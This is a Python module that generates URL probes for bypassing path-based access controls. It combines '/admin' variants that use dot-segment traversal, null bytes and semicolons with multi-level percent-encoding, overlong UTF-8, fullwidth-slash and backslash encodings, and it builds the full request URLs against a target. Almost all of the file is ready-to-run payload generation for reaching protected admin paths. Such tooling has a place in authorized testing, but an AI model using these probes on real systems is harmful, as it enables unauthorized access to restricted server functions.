"""Normalization probes — same payload, multiple encoding depths."""
from typing import List, Tuple
from urllib.parse import quote

# Base paths that mean something to a server.
BASE_PATHS = [
    "/admin",
    "/../admin",
    "/./admin",
    "/admin/.",
    "/admin/..",
    "/api/../admin",
    "/static/../admin",
    "/admin%00",
    "/admin;",
    "/admin%3b",
]

# Encoding chains: (name, function)
ENCODING_CHAINS: List[Tuple[str, callable]] = [
    ("raw",       lambda s: s),
    ("pct1",      lambda s: s.replace("/", "%2f").replace(".", "%2e")),
    ("pct2",      lambda s: s.replace("/", "%252f").replace(".", "%252e")),
    ("pct3",      lambda s: s.replace("/", "%25252f").replace(".", "%25252e")),
    ("mixed",     lambda s: s.replace("/", "%2f", 1).replace("/", "%252f", 1)),
    ("overlong",  lambda s: s.replace("/", "%c0%af")),
    ("unicode",   lambda s: s.replace("/", "%ef%bc%8f")),
    ("backslash", lambda s: s.replace("/", "\\")),
    ("bs_pct",    lambda s: s.replace("/", "%5c")),
    ("bs_pct2",   lambda s: s.replace("/", "%255c")),
]


def build_probes(base_url: str) -> List[dict]:
    """Return list of probe dicts: {label, path, sent, base, chain}."""
    probes = []
    for base in BASE_PATHS:
        for cname, fn in ENCODING_CHAINS:
            encoded = fn(base)
            probes.append({
                "label": f"{base}|{cname}",
                "base": base,
                "chain": cname,
                "path": encoded,
                "sent": base_url.rstrip("/") + encoded,
            })
    return probes
